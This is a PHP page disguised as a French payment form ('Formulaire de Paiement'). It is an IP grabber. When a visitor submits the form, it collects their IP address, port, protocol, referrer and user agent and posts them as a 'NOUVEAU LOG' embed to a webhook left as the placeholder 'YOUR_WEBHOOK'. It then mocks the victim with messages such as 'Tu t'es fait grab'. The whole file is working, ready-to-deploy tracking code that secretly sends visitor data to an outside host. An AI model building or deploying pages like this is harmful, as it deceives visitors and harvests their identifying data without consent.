<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $webhook_url = 'YOUR_WEBHOOK'; 

    $ip = !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) === false) {
        $ip = 'IPv6';
    }
    
    $port = $_SERVER['REMOTE_PORT'];
    $version = $_SERVER['SERVER_PROTOCOL'];
    $agent = $_SERVER['HTTP_USER_AGENT'];
    $ref = $_SERVER['HTTP_REFERER'];

    // Connexion / Géolocalisation
    $message1 = "IP : $ip\n";
    $message1 .= "Port : $port\n";
    $message1 .= "Version : $version\n";

    // Navigateur
    $message2 = "Version : $version\n";
    $message2 .= "Lien : $ref\n";
    $message2 .= "User-Agent : $agent";

    $dark_blue_color = hexdec("00008B");

    function send_webhook($webhook_url, $embed) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $webhook_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Content-Type: application/json'
        ));
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["embeds" => [$embed]]));

        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        curl_close($ch);
    }

    $embed = [
        "title" => "***🎯・NOUVEAU LOG :***",
        "description" => "***📍・CONNEXION/GÉOLOCALISATION :***\n" .
                         "***$message1***\n" .
                         "***🌐・NAVIGATEUR :***\n" .
                         "***$message2***\n",

        "color" => $dark_blue_color
    ];
    send_webhook($webhook_url, $embed);

    $ch2 = curl_init();
    curl_setopt($ch2, CURLOPT_URL, $webhook_url);
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch2, CURLOPT_POST, true);
    $postData4 = [
        "file" => curl_file_create(__DIR__ . '/data/images/ligne.gif', 'image/gif', 'ligne.gif')
    ];

    curl_setopt($ch2, CURLOPT_POSTFIELDS, $postData4);

    $response4 = curl_exec($ch2);

    if (curl_errno($ch2)) {
        echo 'Erreur cURL (quatrième requête) : ' . curl_error($ch2);
    }

    curl_close($ch2);

        $thankYouMessage = true;
    } else {
        $thankYouMessage = false;
    }
?>

<?php
$erreur1 = "Tu t'es fait grab 😮😮😮";
$erreur2 = "BAHAHAHA 🤣🤣🤣";
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire de Paiement</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            background-color: #141414;
            color: white;
            padding: 20px;
            font-family: Arial, sans-serif;
            text-align: center;
        }

        .error-message {
            display: block;
            color: white;
            background-color: red;
            padding: 20px;
            margin-top: 20px;
            border-radius: 5px;
            font-size: 24px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="error-message"><?php echo $erreur1; ?></div>
    <div class="error-message"><?php echo $erreur2; ?></div>
</body>

</html>
